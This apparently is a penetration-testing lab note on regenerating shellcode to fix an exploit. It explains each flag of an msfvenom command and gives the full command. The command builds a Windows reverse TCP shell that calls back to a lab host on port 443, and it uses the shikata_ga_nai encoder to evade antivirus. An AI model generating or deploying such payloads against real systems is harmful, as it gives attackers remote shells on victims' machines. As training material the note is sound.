# fixing exploit (memory issue)
- Generate new shell code
    
    -p windows/shell_reverse_tcp: This specifies the payload to use, in this case a Windows reverse TCP shell. This payload will cause the target system to connect back to the attacker's system and provide a command shell.

    EXITFUNC=thread: This specifies the exit function to use when the shellcode is executed. The "thread" option causes the shellcode to exit by terminating the current thread, rather than the entire process.

    -f c: This specifies the output format for the shellcode, in this case C code.

    -e x86/shikata_ga_nai: This specifies the encoder to use for the shellcode, in this case the "shikata_ga_nai" encoder. This encoder is used to obfuscate the shellcode and make it more difficult to detect by antivirus software.

    -b "\x00\x0a\x0d\x25\x26\x2b\x3d": This specifies a list of bad characters to avoid in the shellcode. These characters are often used in string termination or other special functions, and can cause problems if they are included in the shellcode.

``` 
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.50.4 LPORT=443 EXITFUNC=thread -f c â€“e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"
